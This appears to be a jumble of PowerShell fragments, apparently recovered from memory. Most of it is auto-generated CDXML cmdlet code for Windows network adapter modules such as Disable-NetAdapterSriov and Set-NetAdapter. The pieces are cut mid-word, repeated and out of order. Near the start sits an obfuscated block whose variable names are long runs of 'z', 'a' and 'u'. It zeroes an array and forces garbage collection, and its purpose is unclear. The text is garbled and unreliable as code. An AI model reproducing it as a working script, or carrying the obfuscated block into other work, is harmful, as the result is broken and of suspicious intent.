}

# .EXTERNALHELP PS_ClusteredScheduledTask_v1.0.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 
'Unregister-ClusteredScheduledTask' -Alias '*'
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz++) { $aaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz] = 0 }
$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz = $zzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzz = $uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuu = $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz = 
$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa = $zz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz = $()
[GC]::Collect()
xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Disable-NetAdapterUso' -Alias 
'*'
essing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapterSriov.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Disable-NetAdapterSriov' -Alias 
'*'
ceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv4')) {
      [object]$__cmdletization_value = ${IPv4}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv6')) {
      [object]$__cmdletization_value = ${IPv6}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('PassThru')) {
      [object]$__cmdletization_value = ${PassThru}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Disable', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $false
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapterRsc.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Disable-NetAdapterRsc' -Alias 
'*'
ceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapterLso.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Disable-NetAdapterLso' -Alias 
'*'
ers, $__cmdletization_returnValue)
$__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and 
$PassThru
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetAdapter' -Alias '*'